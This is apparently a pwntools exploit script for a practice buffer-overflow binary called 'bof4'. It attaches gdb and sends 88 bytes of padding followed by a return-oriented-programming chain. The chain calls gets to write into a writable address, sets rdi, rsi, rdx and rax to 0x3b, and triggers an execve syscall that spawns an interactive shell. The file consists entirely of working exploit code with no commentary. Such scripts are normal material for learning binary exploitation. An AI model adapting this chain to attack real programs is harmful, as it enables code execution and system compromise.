from pwn import *
exe = ELF("./bof4")
p = process("./bof4")
gdb.attach(p, gdbscript='''
           b*main+51
           c
           ''')
input()
rw = 0x406c80
pop_rdi = 0x000000000040220e
pop_rax = 0x0000000000401001
pop_rsi = 0x00000000004015ae
pop_rdx = 0x00000000004043e4
syscall = 0x000000000040132e



payload = b"a" * 88
payload += p64(pop_rdi)
payload += p64(rw)
payload += p64(exe.sym['gets'])
payload += p64(pop_rdi)
payload += p64(rw)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += b"a" * 0x28
payload += p64(pop_rax)
payload += p64(0x3b)
payload += p64(syscall)
p.sendlineafter(b": ", payload)

p.interactive()
